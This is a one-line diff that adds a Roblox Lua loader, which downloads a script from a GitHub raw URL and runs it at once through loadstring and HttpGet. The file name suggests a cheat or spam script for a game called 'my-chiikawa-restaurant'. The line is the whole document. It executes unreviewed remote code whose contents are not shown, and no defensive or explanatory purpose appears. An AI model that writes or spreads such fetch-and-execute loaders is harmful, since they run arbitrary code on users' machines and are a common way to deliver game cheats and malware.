@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/my-chiikawa-restaurant-spam3-ufuplsorntna3i.lua"))()
